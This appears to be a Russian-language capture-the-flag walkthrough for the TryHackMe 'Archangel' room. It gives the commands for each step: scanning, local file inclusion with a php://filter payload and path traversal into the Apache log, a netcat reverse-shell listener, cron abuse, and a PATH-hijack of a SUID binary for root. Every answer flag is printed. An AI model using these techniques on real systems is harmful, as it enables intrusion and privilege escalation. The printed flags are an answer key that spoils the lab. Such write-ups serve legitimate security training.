[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Archangel](https://tryhackme.com/r/room/archangel) 

Всего 3 задания:
## Задание 1
Известная компания по решениям безопасности, похоже, проводит некоторые испытания на своей рабочей машине. Лучшее время для эксплуатации.
### Ответьте на вопросы ниже
 Подключитесь к OpenVPN и разверните машину.
```commandline
Ответ не нужен
```

## Задание 2
Перечислите машины
### Ответьте на вопросы ниже
Найдите другое имя хоста
```commandline
nmap -sC -sV -A -p- $IP
gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.tx
curl -s <IP> | grep ".thm"
```
```commandline
mafialive.thm
```
Найти флаг 1
```commandline
echo "<IP> mafialive.thm" | sudo tee -a /etc/hosts
curl -s http://mafialive.thm/
```
```commandline
thm{f0und_th3_r1ght_h0st_n4m3}
```
Посмотрите на страницу в разработке
```commandline
curl -s http://mafialive.thm/robots.txt
```
```commandline
test.php
```
Найти флаг 2
```commandline
curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/test.php
curl -s http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw
+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d 
```
```commandline
thm{explo1t1ng_lf1}
```
Получите оболочку и найдите флаг пользователя
```commandline
curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log

nc -lvnp 4444
python3 -c "import pty;pty.spawn('/bin/bash')"
id
ls
cat user.txt
```
```commandline
thm{lf1_t0_rc3_1s_tr1cky}
```

## Задание 3
Повышение привилегий 
### Ответьте на вопросы ниже
Получить флаг пользователя 2 
```commandline
cat /etc/crontab
nc -lvnp 4445
ls -la
cat helloworld.sh
cd secret
ls
cat user2.txt
```
```commandline
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
```
Получите права root на машине и найдите флаг root
```commandline
find /* -type f -perm -u=s 2>/dev/null
touch cp
nano cp
cat cp
#!/bin/bash
/bin/bash

chmod +x cp
export PATH=/home/archangel/secret:$PATH
./backup
cat /root/root.txt
```
```commandline
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)